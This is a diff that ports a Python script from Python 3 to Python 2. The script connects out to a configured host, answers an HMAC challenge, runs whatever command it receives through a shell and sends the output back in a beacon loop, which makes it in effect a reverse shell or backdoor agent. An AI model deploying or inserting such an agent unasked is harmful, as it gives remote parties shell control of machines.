@@ -3,7 +3,7 @@ import json
 import time
 import hmac
 import hashlib
-import subprocess
+import commands  # Python 2 replacement for subprocess.getoutput
 
 CONFIG_FILE = "config.json"
 
@@ -21,7 +21,7 @@ def create_connection(host, port):
 
 
 def compute_hmac(secret, message):
-    return hmac.new(secret.encode(), message, hashlib.sha256).digest()
+    return hmac.new(secret, message, hashlib.sha256).digest()
 
 
 def authenticate(sock, secret):
@@ -33,7 +33,7 @@ def authenticate(sock, secret):
         response = compute_hmac(secret, challenge)
         sock.sendall(response)
 
-        result = sock.recv(1024).decode()
+        result = sock.recv(1024)
         return result == "OK"
     except:
         return False
@@ -41,10 +41,10 @@ def authenticate(sock, secret):
 
 def execute_command(command):
     try:
-        result = subprocess.getoutput(command)
+        result = commands.getoutput(command)
         return result
     except Exception as e:
-        return f"ERROR: {str(e)}"
+        return "ERROR: " + str(e)
 
 
 def main():
@@ -59,7 +59,7 @@ def main():
                 time.sleep(sleep_time)
                 continue
 
-            command = sock.recv(4096).decode()
+            command = sock.recv(4096)
 
             if not command:
                 sock.close()
@@ -73,7 +73,7 @@ def main():
 
             output = execute_command(command)
 
-            sock.sendall(output.encode())
+            sock.sendall(output)
 
             sock.close()
 
